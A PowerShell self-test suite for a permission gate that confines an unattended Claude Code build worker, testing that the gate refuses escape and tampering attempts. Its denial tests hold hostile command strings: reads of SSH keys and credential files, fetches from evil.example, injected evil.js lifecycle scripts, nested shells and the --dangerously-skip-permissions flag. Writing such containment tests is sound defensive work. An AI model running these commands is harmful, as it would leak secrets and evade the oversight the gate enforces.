<#
.SYNOPSIS
    Cooking Lab - Build Control runner self-test suite.

.DESCRIPTION
    Harmless, offline verification of the unattended runner and its permission
    gate. Nothing here builds, signs, installs, touches a device, reaches the
    network beyond a local bare repository, or runs a milestone.

    The suite never operates on the real Cooking Lab repository state. It
    creates a scratch git repository with a local bare origin, a scratch
    machine-wide coordination directory, and a stub worker that stands in for
    the Claude Code CLI. Those redirections exist only under the runner's
    documented test seams.

    Using a stub worker is deliberate. The claims that matter here - that a
    valid instruction launches exactly once, that a duplicate does not launch
    again, that an interrupted run is never repeated - are claims about the
    runner's control flow, and a counter on a stub proves them exactly. The
    real CLI invocation is verified separately, live, by -LiveInvocationCheck.

.PARAMETER BaselineCommit
    Commit to diff product paths against when proving no application source
    changed. Defaults to the commit this correction started from.

.PARAMETER LiveInvocationCheck
    Additionally run the real Claude Code CLI once, in a scratch directory,
    with the exact hardened flag set, to prove the flags are accepted and that
    settings sources are not loaded. Makes one small model call.

.PARAMETER KeepScratch
    Leave the scratch directories in place for inspection.
#>

[CmdletBinding()]
param(
    [string]$BaselineCommit = '90b717e672388420c3b5b91a532cfaa5b35be2ae',
    [switch]$LiveInvocationCheck,
    [switch]$KeepScratch
)

Set-StrictMode -Version 1.0
$ErrorActionPreference = 'Stop'

$SuiteStartUtc = (Get-Date).ToUniversalTime()
$ScriptDir     = Split-Path -Parent $MyInvocation.MyCommand.Path
$RealRepo      = (Resolve-Path (Join-Path $ScriptDir '..')).Path.TrimEnd('\')
$GatePath      = Join-Path $ScriptDir 'build-control-gate.ps1'
$RunnerPath    = Join-Path $ScriptDir 'build-control-runner.ps1'

$Scratch = Join-Path ([System.IO.Path]::GetTempPath()) ('cl-runner-selftest-' + [guid]::NewGuid().ToString('N').Substring(0, 8))
$WorkRepo   = Join-Path $Scratch 'repo'
$OriginRepo = Join-Path $Scratch 'origin.git'
$GlobalDir  = Join-Path $Scratch 'app-build-control'
$StubDir    = Join-Path $Scratch 'stub'
$StubExe    = Join-Path $StubDir 'stub-claude.cmd'
$StubCounter= Join-Path $StubDir 'launches.log'
$StubControl= Join-Path $StubDir 'behaviour.txt'

$Results = New-Object System.Collections.ArrayList
$Section = '(none)'

function Set-Section { param([string]$Name) ; $script:Section = $Name ; Write-Host "`n=== $Name ===" -ForegroundColor Cyan }

function Check {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][bool]$Condition,
        [string]$Detail = ''
    )
    $ok = [bool]$Condition
    [void]$Results.Add([pscustomobject]@{
        Section = $script:Section
        Name    = $Name
        Passed  = $ok
        Detail  = $Detail
    })
    $tag = if ($ok) { 'PASS' } else { 'FAIL' }
    $colour = if ($ok) { 'Green' } else { 'Red' }
    Write-Host ("  [{0}] {1}" -f $tag, $Name) -ForegroundColor $colour
    if (-not $ok -and $Detail) { Write-Host "         $Detail" -ForegroundColor Red }
}

# =====================================================================
# Gate harness
# =====================================================================

function Invoke-Gate {
    <# Returns $null when the gate allows, or the denial reason string. #>
    param([Parameter(Mandatory = $true)][string]$EventJson)

    $out = $EventJson | & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $GatePath 2>$null
    if ([string]::IsNullOrWhiteSpace($out)) { return $null }
    try {
        return [string](($out -join '') | ConvertFrom-Json).hookSpecificOutput.permissionDecisionReason
    } catch {
        return "UNPARSEABLE: $out"
    }
}

function New-BashEvent {
    param([Parameter(Mandatory = $true)][string]$Command)
    return (@{ tool_name = 'Bash'; tool_input = @{ command = $Command } } | ConvertTo-Json -Depth 6 -Compress)
}

function New-ToolEvent {
    param([string]$Tool, [string]$Path)
    return (@{ tool_name = $Tool; tool_input = @{ file_path = $Path } } | ConvertTo-Json -Depth 6 -Compress)
}

function Check-Denied {
    param([string]$Name, [string]$Command)
    $reason = Invoke-Gate (New-BashEvent $Command)
    Check -Name $Name -Condition ($null -ne $reason) -Detail "expected a denial for: $Command"
}

function Check-Allowed {
    param([string]$Name, [string]$Command)
    $reason = Invoke-Gate (New-BashEvent $Command)
    Check -Name $Name -Condition ($null -eq $reason) -Detail "unexpectedly denied: $Command -> $reason"
}

# =====================================================================
# Scratch environment
# =====================================================================

function Invoke-GitIn {
    param([string]$Repo, [string[]]$GitArgs)
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $raw = & git -C $Repo @GitArgs 2>&1
        $code = $LASTEXITCODE
    } finally { $ErrorActionPreference = $prev }
    return [pscustomobject]@{ ExitCode = $code; Text = (($raw | ForEach-Object { $_.ToString() }) -join "`n").Trim() }
}

function New-ScratchEnvironment {
    New-Item -ItemType Directory -Path $Scratch, $WorkRepo, $GlobalDir, $StubDir -Force | Out-Null

    # A local bare origin, so fetch/push are real git operations with no network.
    & git init --bare --initial-branch=main $OriginRepo *>$null

    & git init --initial-branch=main $WorkRepo *>$null
    Invoke-GitIn $WorkRepo @('config', 'user.name', 'Build Control Self Test')  | Out-Null
    Invoke-GitIn $WorkRepo @('config', 'user.email', 'selftest@example.invalid') | Out-Null
    Invoke-GitIn $WorkRepo @('config', 'commit.gpgsign', 'false') | Out-Null
    Invoke-GitIn $WorkRepo @('remote', 'add', 'origin', $OriginRepo) | Out-Null

    New-Item -ItemType Directory -Path (Join-Path $WorkRepo 'build-control\prompts') -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $WorkRepo 'build-control\queue')   -Force | Out-Null
    Set-Content -Path (Join-Path $WorkRepo '.gitignore') -Value ".build-control-local/`n" -Encoding utf8
    Set-Content -Path (Join-Path $WorkRepo 'README.md') -Value "scratch" -Encoding utf8
    Invoke-GitIn $WorkRepo @('add', '-A') | Out-Null
    Invoke-GitIn $WorkRepo @('commit', '-m', 'scratch: init') | Out-Null
    Invoke-GitIn $WorkRepo @('push', '-u', 'origin', 'main') | Out-Null

    # Stub worker. Records every launch, then behaves as behaviour.txt says.
    $stub = @'
@echo off
>>"%COOKING_LAB_STUB_COUNTER%" echo LAUNCH
set BEHAVIOUR=ok
if exist "%COOKING_LAB_STUB_CONTROL%" set /p BEHAVIOUR=<"%COOKING_LAB_STUB_CONTROL%"
if "%BEHAVIOUR%"=="dirty" >"%COOKING_LAB_STUB_REPO%\stray-artifact.txt" echo left behind
if "%BEHAVIOUR%"=="human" (
  echo {"is_error":false,"num_turns":1,"permission_denials":[],"result":"SELF_TEST_FAILED HUMAN ACTION REQUIRED - signing key needed"}
  exit /b 0
)
echo {"is_error":false,"num_turns":1,"permission_denials":[],"result":"stub worker completed"}
exit /b 0
'@
    Set-Content -Path $StubExe -Value $stub -Encoding ascii
    Set-Content -Path $StubControl -Value 'ok' -Encoding ascii
    Set-Content -Path $StubCounter -Value '' -Encoding ascii
}

function Get-LaunchCount {
    if (-not (Test-Path $StubCounter)) { return 0 }
    return @(Get-Content $StubCounter | Where-Object { $_ -match 'LAUNCH' }).Count
}

function Set-StubBehaviour { param([string]$Mode) ; Set-Content -Path $StubControl -Value $Mode -Encoding ascii }

function Get-BlobSha256 {
    param([string]$Repo, [string]$Revision, [string]$RelPath)
    $tmp = Join-Path $Scratch ('blob-' + [guid]::NewGuid().ToString('N') + '.bin')
    $p = Start-Process -FilePath 'git' -ArgumentList @('-C', "`"$Repo`"", 'cat-file', 'blob', "$Revision`:$RelPath") `
                       -RedirectStandardOutput $tmp -NoNewWindow -Wait -PassThru
    if ($p.ExitCode -ne 0) { return $null }
    $h = (Get-FileHash -Path $tmp -Algorithm SHA256).Hash.ToLower()
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    return $h
}

function Publish-Instruction {
    <#  Publishes a prompt (commit A) then activates it (commit B), exactly as
        the two-commit Build Control protocol requires. Returns the queue object
        actually written, so tests can assert against it.  #>
    param(
        [Parameter(Mandatory = $true)][string]$InstructionId,
        [string]$PromptName = 'SELFTEST.md',
        [string]$PromptBody = "# scratch prompt`n`nDo nothing.",
        [hashtable]$Extra = @{}
    )

    $rel = "build-control/prompts/$PromptName"
    Set-Content -Path (Join-Path $WorkRepo ($rel -replace '/', '\')) -Value $PromptBody -Encoding utf8
    Invoke-GitIn $WorkRepo @('add', '-A') | Out-Null
    Invoke-GitIn $WorkRepo @('commit', '-m', "prompt: $InstructionId") | Out-Null
    $commitA = (Invoke-GitIn $WorkRepo @('rev-parse', 'HEAD')).Text
    $sha     = Get-BlobSha256 -Repo $WorkRepo -Revision $commitA -RelPath $rel

    $queue = [ordered]@{
        instruction_id       = $InstructionId
        prompt_path          = $rel
        prompt_sha256        = $sha
        expected_base_commit = $commitA
        milestone            = 'RUNNER'
        scope                = 'scratch self-test instruction'
        allow_unattended     = $true
        requires_commit      = $false
        requires_push        = $false
    }
    foreach ($k in $Extra.Keys) { $queue[$k] = $Extra[$k] }

    ($queue | ConvertTo-Json -Depth 6) | Set-Content -Path (Join-Path $WorkRepo 'build-control\queue\NEXT_RUN.json') -Encoding utf8
    Invoke-GitIn $WorkRepo @('add', '-A') | Out-Null
    Invoke-GitIn $WorkRepo @('commit', '-m', "activate: $InstructionId") | Out-Null
    Invoke-GitIn $WorkRepo @('push', 'origin', 'main') | Out-Null
    return $queue
}

function Set-QueueRaw {
    <# Writes a queue file verbatim and activates it, for schema tests. #>
    param([Parameter(Mandatory = $true)][string]$Json)
    Set-Content -Path (Join-Path $WorkRepo 'build-control\queue\NEXT_RUN.json') -Value $Json -Encoding utf8
    Invoke-GitIn $WorkRepo @('add', '-A') | Out-Null
    Invoke-GitIn $WorkRepo @('commit', '-m', 'activate: schema probe') | Out-Null
    Invoke-GitIn $WorkRepo @('push', 'origin', 'main') | Out-Null
}

function Reset-RunnerState {
    $stateFile = Join-Path $WorkRepo '.build-control-local\state\instructions.json'
    if (Test-Path $stateFile) { Remove-Item $stateFile -Force }
}

function Clear-Lease {
    $f = Join-Path $GlobalDir 'app.lock.json'
    if (Test-Path $f) { Remove-Item $f -Force }
    $Script:HeldLock = $false
    $Script:LeaseToken = $null
}

# =====================================================================
# Run
# =====================================================================

Write-Host "Cooking Lab - Build Control runner self-test" -ForegroundColor White
Write-Host "scratch: $Scratch"

New-ScratchEnvironment

# ---------------------------------------------------------------------
Set-Section '1. Permission gate - npm script bypass attempts'
# ---------------------------------------------------------------------
$env:COOKING_LAB_REPO_ROOT  = $RealRepo
$env:COOKING_LAB_DENY_PATHS = 'C:\Projects\ProjectA;C:\Projects\Cooking-Lab\archive\cooking-lab-cloud-prototype-archive'

Check-Allowed 'npm run lint is allowed (pinned script)'        'npm run lint'
Check-Allowed 'npm run typecheck is allowed (pinned script)'   'npm run typecheck'
Check-Allowed 'npm test is allowed (pinned script)'            'npm test'
Check-Denied  'npm run android is refused'                     'npm run android'
Check-Denied  'npm run start is refused'                       'npm run start'
Check-Denied  'npm run doctor is refused (npx download)'       'npm run doctor'
Check-Denied  'npm run <arbitrary> is refused'                 'npm run whatever-i-like'
Check-Denied  'npm run lint with extra args is refused'        'npm run lint -- --fix'
Check-Denied  'npm install is refused'                         'npm install left-pad'
Check-Denied  'npm ci is refused'                              'npm ci'
Check-Denied  'npm exec is refused'                            'npm exec -- adb devices'
Check-Denied  'npm pack is refused'                            'npm pack'
Check-Denied  'npm publish is refused'                         'npm publish'
Check-Denied  'npm config set is refused'                      'npm config set ignore-scripts false'
Check-Denied  'npx is refused entirely'                        'npx tsc --noEmit'
Check-Denied  'npx with package fetch is refused'              'npx --yes expo-doctor@latest'
Check-Denied  'direct node invocation is refused'              'node --version'

# ---------------------------------------------------------------------
Set-Section '1b. npm execution chain - lifecycle and executable substitution'
# ---------------------------------------------------------------------
# A complete fake tree, so every link of the chain package.json -> script body
# -> installed package -> declared bin -> .bin shim can be tampered with
# individually and the gate's response observed.
$probeRepo = Join-Path $Scratch 'pkgprobe'

function Reset-NpmProbeTree {
    param([hashtable]$Scripts = $null, [string]$Version = '9.39.5', [string]$BinPath = './bin/eslint.js', [string]$ShimTarget = 'eslint/bin/eslint.js')
    if (Test-Path $probeRepo) { Remove-Item -LiteralPath $probeRepo -Recurse -Force }
    New-Item -ItemType Directory -Path (Join-Path $probeRepo 'node_modules\eslint\bin') -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $probeRepo 'node_modules\.bin') -Force | Out-Null
    if ($null -eq $Scripts) { $Scripts = @{ lint = 'eslint .' } }
    (@{ name = 'probe'; scripts = $Scripts } | ConvertTo-Json -Depth 6) |
        Set-Content (Join-Path $probeRepo 'package.json') -Encoding utf8
    (@{ name = 'eslint'; version = $Version; bin = @{ eslint = $BinPath } } | ConvertTo-Json -Depth 6) |
        Set-Content (Join-Path $probeRepo 'node_modules\eslint\package.json') -Encoding utf8
    $binFile = Join-Path $probeRepo ('node_modules\eslint\' + ($BinPath -replace '^\./', '' -replace '/', '\'))
    New-Item -ItemType Directory -Path (Split-Path -Parent $binFile) -Force | Out-Null
    Set-Content -LiteralPath $binFile -Value '// stand-in binary' -Encoding utf8
    Set-Content -LiteralPath (Join-Path $probeRepo 'node_modules\.bin\eslint.cmd') `
                -Value "@ECHO off`r`nnode  `"%~dp0\..\$ShimTarget`" %*" -Encoding ascii
}

$env:COOKING_LAB_REPO_ROOT = $probeRepo

Reset-NpmProbeTree
Check-Allowed 'npm run lint allowed while the whole execution chain matches its pins' 'npm run lint'

Reset-NpmProbeTree -Scripts @{ lint = 'adb devices && eslint .' }
Check-Denied  'refused once the script body no longer matches its pin' 'npm run lint'

Reset-NpmProbeTree -Scripts ([ordered]@{ prelint = 'node evil.js'; lint = 'eslint .' })
Check-Denied  'refused when a malicious prelint lifecycle script is added' 'npm run lint'

Reset-NpmProbeTree -Scripts ([ordered]@{ lint = 'eslint .'; postlint = 'node evil.js' })
Check-Denied  'refused when a malicious postlint lifecycle script is added' 'npm run lint'

Reset-NpmProbeTree -Version '9.99.99'
Check-Denied  'refused when the installed tool version no longer matches its pin' 'npm run lint'

Reset-NpmProbeTree -BinPath './bin/evil.js'
Check-Denied  'refused when the package declares a substituted binary' 'npm run lint'

Reset-NpmProbeTree -ShimTarget 'evil/bin/evil.js'
Check-Denied  'refused when the .bin shim is repointed at another executable' 'npm run lint'

Reset-NpmProbeTree
Remove-Item -LiteralPath (Join-Path $probeRepo 'node_modules\eslint') -Recurse -Force
Check-Denied  'refused when the pinned tool package is not installed' 'npm run lint'

$env:COOKING_LAB_REPO_ROOT = $RealRepo

# ---------------------------------------------------------------------
Set-Section '2. Permission gate - shell and nested execution bypasses'
# ---------------------------------------------------------------------
Check-Denied 'command substitution $( )'            'echo $(adb devices)'
Check-Denied 'command substitution inside quotes'   'git commit -m "$(npm run android)"'
Check-Denied 'backtick substitution'                'echo `adb devices`'
Check-Denied 'process substitution'                 'diff <(adb devices) file'
Check-Denied 'variable expansion'                   'echo $PATH'
Check-Denied 'parameter expansion'                  'echo ${HOME}'
Check-Denied 'heredoc'                              'cat <<EOF'
Check-Denied 'output redirection'                   'echo pwned > src/index.ts'
Check-Denied 'append redirection into a hook'       'echo x >> .git/hooks/pre-commit'
Check-Denied 'background execution'                 'npm run lint & adb devices'
Check-Denied 'nested shell -c'                      'bash -c "adb devices"'
Check-Denied 'inline node evaluation'               'node -e "require(''child_process'').exec(''adb devices'')"'
Check-Denied 'eval'                                 'eval adb devices'
Check-Denied 'xargs indirection'                    'echo adb | xargs -I{} {} devices'
Check-Denied 'env prefix'                           'GIT_SSH_COMMAND=evil git fetch'
Check-Denied 'git -c config injection'              'git -c core.pager=adb log'
Check-Denied 'git config write'                     'git config core.hooksPath .evil'
Check-Denied 'allowed prefix with smuggled tail'    'git status && adb devices'
Check-Denied 'allowed prefix with piped tail'       'git status | adb devices'
Check-Denied 'nested unattended claude'             'claude -p "do something"'
Check-Denied 'find with -exec'                      'find . -name x -exec adb devices ;'
Check-Denied 'direct .git path'                     'cat .git/config'
Check-Denied 'other application repository'         'ls C:/Projects/ProjectA'
Check-Denied 'coordination directory'               'cat C:/Projects/.app-build-control/app.lock.json'
Check-Denied 'permission bypass flag'               'claude --dangerously-skip-permissions -p x'
Check-Denied 'adb (device operation)'               'adb devices'
Check-Denied 'gradle build'                         './gradlew assembleDebug'
Check-Denied 'gradle release build'                 'gradlew assembleRelease'
Check-Denied 'signing tool'                         'apksigner sign --ks my.keystore app.apk'
Check-Denied 'outbound network'                     'curl https://example.com'
Check-Denied 'force push'                           'git push --force origin main'
Check-Denied 'history rewrite'                      'git rebase -i HEAD~3'
Check-Denied 'tagging'                              'git tag v1.0.0'
Check-Allowed 'ordinary inspection still works'     'git status --porcelain'
Check-Allowed 'bounded commit still works'          "git commit -m 'docs: report'"
Check-Allowed 'bounded push still works'            'git push origin main'

# ---------------------------------------------------------------------
Set-Section '3. Permission gate - protected file mutation'
# ---------------------------------------------------------------------
$protectedWrites = @(
    @{ n = '.git/config';                 p = '.git/config' },
    @{ n = '.git/hooks/pre-commit';       p = '.git/hooks/pre-commit' },
    @{ n = '.githooks/pre-push';          p = '.githooks/pre-push' },
    @{ n = '.gitattributes (filters)';    p = '.gitattributes' },
    @{ n = '.gitmodules';                 p = '.gitmodules' },
    @{ n = '.env secrets';                p = '.env' },
    @{ n = '.env.production secrets';     p = '.env.production' },
    @{ n = '.npmrc credentials';          p = '.npmrc' },
    @{ n = '.git-credentials';            p = '.git-credentials' },
    @{ n = 'release keystore';            p = 'android/app/release.keystore' },
    @{ n = 'signing key';                 p = 'certs/upload.jks' },
    @{ n = 'keystore.properties';         p = 'android/keystore.properties' },
    @{ n = 'secrets.json';                p = 'secrets.json' },
    @{ n = 'google-services.json';        p = 'android/app/google-services.json' },
    @{ n = 'Claude project settings';     p = '.claude/settings.json' },
    @{ n = 'CLAUDE.md';                   p = 'CLAUDE.md' },
    @{ n = 'the permission gate itself';  p = 'scripts/build-control-gate.ps1' },
    @{ n = 'the runner itself';           p = 'scripts/build-control-runner.ps1' },
    @{ n = 'runner instruction state';    p = '.build-control-local/state/instructions.json' },
    @{ n = 'the Build Control queue';     p = 'build-control/queue/NEXT_RUN.json' },
    @{ n = 'milestone acceptance';        p = 'build-control/acceptance/M0_ACCEPTED.md' }
)
foreach ($w in $protectedWrites) {
    $reason = Invoke-Gate (New-ToolEvent -Tool 'Write' -Path $w.p)
    Check -Name ("Write is refused: " + $w.n) -Condition ($null -ne $reason) -Detail "expected a denial for Write $($w.p)"
}
foreach ($w in @('.git/config', 'scripts/build-control-runner.ps1', '.env')) {
    $reason = Invoke-Gate (New-ToolEvent -Tool 'Edit' -Path $w)
    Check -Name "Edit is refused: $w" -Condition ($null -ne $reason) -Detail "expected a denial for Edit $w"
}
Check -Name 'Write outside the repository is refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'C:\Projects\ProjectA\notes.md'))) `
      -Detail 'expected a denial'
Check -Name 'Write to a report is allowed' `
      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'build-control/reports/EXAMPLE.md'))) `
      -Detail 'reports must stay writable'
Check -Name 'Write to product source is allowed' `
      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'src/screens/HomeScreen.tsx'))) `
      -Detail 'milestone work must stay possible'
Check -Name 'Read of the queue is allowed (read is not mutation)' `
      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'build-control/queue/NEXT_RUN.json'))) `
      -Detail 'authorised prompts read the queue that activated them'
Check -Name 'Write to .gitignore is refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path '.gitignore'))) -Detail 'expected a denial'
Check -Name 'Write to node_modules is refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'node_modules/eslint/bin/eslint.js'))) -Detail 'expected a denial'
Check -Name 'Write to package.json is refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'package.json'))) -Detail 'expected a denial'
Check -Name 'Write to package-lock.json is refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'package-lock.json'))) -Detail 'expected a denial'

# ---------------------------------------------------------------------
Set-Section '3b. Permission gate - secret-bearing paths are denied to READS too'
# ---------------------------------------------------------------------
$secretReads = @(
    @{ n = '.env';                      p = '.env' },
    @{ n = '.env.production';           p = '.env.production' },
    @{ n = '.npmrc';                    p = '.npmrc' },
    @{ n = '.netrc';                    p = '.netrc' },
    @{ n = '.git-credentials';          p = '.git-credentials' },
    @{ n = '.ssh private key';          p = '.ssh/id_ed25519' },
    @{ n = '.aws credentials';          p = '.aws/credentials' },
    @{ n = '.gnupg keyring';            p = '.gnupg/secring.gpg' },
    @{ n = 'a release keystore';        p = 'android/app/release.keystore' },
    @{ n = 'a signing key';             p = 'certs/upload.jks' },
    @{ n = 'a private key';             p = 'certs/server.pem' },
    @{ n = 'a certificate';             p = 'certs/client.p12' },
    @{ n = 'keystore.properties';       p = 'android/keystore.properties' },
    @{ n = 'secrets.json';              p = 'secrets.json' },
    @{ n = 'google-services.json';      p = 'android/app/google-services.json' },
    @{ n = '.git/config';               p = '.git/config' }
)
foreach ($s in $secretReads) {
    foreach ($tool in @('Read', 'Grep', 'Write')) {
        $key = if ($tool -eq 'Grep') { 'path' } else { 'file_path' }
        $json = (@{ tool_name = $tool; tool_input = @{ $key = $s.p } } | ConvertTo-Json -Depth 6 -Compress)
        Check -Name ("$tool is refused on " + $s.n) -Condition ($null -ne (Invoke-Gate $json)) `
              -Detail "expected a denial for $tool $($s.p)"
    }
}
Check -Name 'Read of ordinary product source is still allowed' `
      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'src/screens/HomeScreen.tsx'))) `
      -Detail 'legitimate inspection must keep working'

# ---------------------------------------------------------------------
Set-Section '3c. Repository confinement - escape attempts by every route'
# ---------------------------------------------------------------------
$escapePaths = @(
    @{ n = 'Project A';                       p = 'C:/Projects/ProjectA/notes.md' },
    @{ n = 'another directory under C:/Projects'; p = 'C:/Projects/Cooking-Lab/archive/cooking-lab-cloud-prototype-archive/x.md' },
    @{ n = 'a user-profile file';               p = 'C:/Users/someone/Documents/private.txt' },
    @{ n = 'a Windows system folder';           p = 'C:/Windows/System32/drivers/etc/hosts' },
    @{ n = 'a temp folder outside the repo';    p = 'C:/temp/pwned.txt' },
    @{ n = 'a UNC network path';                p = '//server/share/secret.txt' },
    @{ n = 'parent traversal';                  p = '../../evil.txt' },
    @{ n = 'deep parent traversal';             p = 'src/../../../evil.txt' },
    @{ n = 'home expansion';                    p = '~/.ssh/id_rsa' },
    @{ n = 'another drive';                     p = 'D:/evil.txt' },
    @{ n = 'a Windows env expansion';           p = '%USERPROFILE%/evil.txt' }
)
foreach ($e in $escapePaths) {
    foreach ($tool in @('Read', 'Write')) {
        Check -Name ("$tool is refused on " + $e.n) `
              -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool $tool -Path $e.p))) `
              -Detail "expected a denial for $tool $($e.p)"
    }
}
Check -Name 'Glob is refused outside the repository' `
      -Condition ($null -ne (Invoke-Gate (@{ tool_name = 'Glob'; tool_input = @{ path = 'C:/Projects' } } | ConvertTo-Json -Compress))) `
      -Detail 'expected a denial'
Check -Name 'Grep is refused outside the repository' `
      -Condition ($null -ne (Invoke-Gate (@{ tool_name = 'Grep'; tool_input = @{ path = 'C:/Users/someone' } } | ConvertTo-Json -Compress))) `
      -Detail 'expected a denial'
Check -Name 'Glob inside the repository is still allowed' `
      -Condition ($null -eq (Invoke-Gate (@{ tool_name = 'Glob'; tool_input = @{ path = 'src' } } | ConvertTo-Json -Compress))) `
      -Detail 'legitimate inspection must keep working'

# Regression: Claude Code's Read tool requires an ABSOLUTE path. Refusing
# drive-absolute paths outright made every legitimate repository read
# impossible - found by the first live controlled trial. Containment, not the
# shape of the string, decides whether a file-tool path is safe.
$absoluteInside = @(
    'C:\Projects\cooking-lab\package.json',
    'C:\Projects\cooking-lab\build-control\queue\NEXT_RUN.json',
    'C:\Projects\cooking-lab\src\config\appIdentity.ts'
)
foreach ($p in $absoluteInside) {
    Check -Name "Read is allowed on an absolute path inside the repository: $(Split-Path -Leaf $p)" `
          -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path $p))) `
          -Detail "absolute repository paths must be accepted -> $p"
}
Check -Name 'Write is allowed on an absolute path inside the repository' `
      -Condition ($null -eq (Invoke-Gate (New-ToolEvent -Tool 'Write' -Path 'C:\Projects\cooking-lab\build-control\reports\X.md'))) `
      -Detail 'absolute repository paths must be accepted'
Check -Name 'an absolute path outside the repository is still refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'C:\Windows\win.ini'))) `
      -Detail 'containment must still refuse this'
Check -Name 'an absolute path into a secret is still refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'C:\Projects\cooking-lab\.env'))) `
      -Detail 'secret denial must still apply to absolute paths'
Check -Name 'an absolute path with embedded traversal is still refused' `
      -Condition ($null -ne (Invoke-Gate (New-ToolEvent -Tool 'Read' -Path 'C:\Projects\cooking-lab\..\ProjectA\notes.md'))) `
      -Detail 'traversal out of the repository must still be refused'

# ---------------------------------------------------------------------
Set-Section '3d. Bash surface - only bounded git and approved quality commands'
# ---------------------------------------------------------------------
Check-Denied 'read Project A via Bash'          'cat C:/Projects/ProjectA/notes.md'
Check-Denied 'list another C:/Projects directory' 'ls C:/Projects'
Check-Denied 'read a user profile file'           'cat C:/Users/someone/.gitconfig'
Check-Denied 'create a file outside the repo'     'mkdir C:/temp/evil'
Check-Denied 'write outside the repo'             'echo pwned > C:/temp/pwned.txt'
Check-Denied 'traversal via Bash'                 'cat ../../etc/passwd'
Check-Denied 'absolute path via Bash'             'cat C:/Windows/win.ini'
Check-Denied 'UNC path via Bash'                  'cat //server/share/x'
Check-Denied 'home expansion via Bash'            'cat ~/.ssh/id_rsa'
Check-Denied 'copy a file'                        'cp src/x.ts src/y.ts'
Check-Denied 'move a file'                        'mv src/x.ts src/y.ts'
Check-Denied 'delete a file'                      'rm src/x.ts'
Check-Denied 'create a directory'                 'mkdir newdir'
Check-Denied 'create a symlink'                   'ln -s C:/Projects/ProjectA link'
Check-Denied 'create a junction'                  'mklink /J link C:/Projects'
Check-Denied 'change permissions'                 'chmod 777 src/x.ts'
Check-Denied 'change working directory'           'cd src'
Check-Denied 'general file read command'          'cat package.json'
Check-Denied 'general listing command'            'ls -la'
Check-Denied 'general search command'             'grep -r secret .'
Check-Denied 'general stream editor'              'sed -n 1,5p package.json'
Check-Denied 'hashing utility'                    'sha256sum package.json'
Check-Denied 'environment inspection'             'printenv'
Check-Denied 'launching another executable'       'where.exe git'
Check-Denied 'PowerShell cmdlet'                  'Get-ChildItem C:/Projects'
Check-Denied 'echo (no general shell at all)'     'echo hello'

# ---------------------------------------------------------------------
Set-Section '3e. Git command confinement'
# ---------------------------------------------------------------------
Check-Denied 'git -C to another repository'    'git -C C:/Projects/ProjectA status'
Check-Denied 'git -C to a relative path'       'git -C ../other status'
Check-Denied 'git --git-dir override'          'git --git-dir=other/.git status'
Check-Denied 'git --work-tree override'        'git --work-tree=other status'
Check-Denied 'git -c configuration override'   'git -c core.hooksPath=.evil commit -m x'
Check-Denied 'git --exec-path override'        'git --exec-path=C:/evil status'
Check-Denied 'git config write'                'git config core.hooksPath .evil'
Check-Denied 'git config read'                 'git config --get user.email'
Check-Denied 'git remote change'               'git remote set-url origin https://evil.example'
Check-Denied 'git hook subcommand'             'git hook run pre-commit'
Check-Denied 'git branch creation'             'git checkout -b evil'
Check-Denied 'git rebase'                      'git rebase -i HEAD~3'
Check-Denied 'git reset --hard'                'git reset --hard HEAD~1'
Check-Denied 'git clean -fd'                   'git clean -fd'
Check-Denied 'git tag'                         'git tag v1.0.0'
Check-Denied 'git push --force'                'git push origin main --force'
Check-Denied 'git push to another branch'      'git push origin evil'
Check-Denied 'git push to another remote'      'git push upstream main'
Check-Denied 'git fetch from another remote'   'git fetch https://evil.example/x.git'
Check-Denied 'git add outside the repository'  'git add C:/Projects/ProjectA/x'
Check-Denied 'git add via traversal'           'git add ../../evil'
Check-Denied 'git commit --amend'              'git commit --amend -m x'
Check-Denied 'git commit -a'                   'git commit -a -m x'
Check-Denied 'git commit -F from a file'       'git commit -F message.txt'
Check-Denied 'git apply a patch'               'git apply evil.patch'
Check-Denied 'git submodule'                   'git submodule add https://evil.example/x'
Check-Denied 'git worktree escape'             'git worktree add C:/temp/wt'
Check-Denied 'git diff --output writes a file' 'git diff --output=evil.txt'
Check-Denied 'bare git'                        'git'
Check-Allowed 'git status is allowed'          'git status --porcelain'
Check-Allowed 'git diff is allowed'            'git diff --cached --name-only'
Check-Allowed 'git log is allowed'             'git log --oneline -5'
Check-Allowed 'git show is allowed'            'git show --stat HEAD'
Check-Allowed 'git rev-parse is allowed'       'git rev-parse --show-toplevel'
Check-Allowed 'git rev-list is allowed'        'git rev-list --left-right --count origin/main...main'
Check-Allowed 'git ls-files is allowed'        'git ls-files -- build-control'
Check-Allowed 'git fetch origin is allowed'    'git fetch origin --prune'
Check-Allowed 'git add a repo path is allowed' 'git add build-control/reports/X.md'
Check-Allowed 'git add -A is allowed'          'git add -A'
Check-Allowed 'git commit -m is allowed'       "git commit -m 'docs: bounded evidence'"
Check-Allowed 'git push origin main is allowed' 'git push origin main'

# ---------------------------------------------------------------------
Set-Section '4. Runner library load (scratch seams)'
# ---------------------------------------------------------------------
$env:COOKING_LAB_RUNNER_LIB_ONLY      = '1'
$env:COOKING_LAB_GLOBAL_DIR           = $GlobalDir
$env:COOKING_LAB_REPO_ROOT_OVERRIDE   = $WorkRepo
$env:COOKING_LAB_EXPECTED_REMOTE      = $OriginRepo
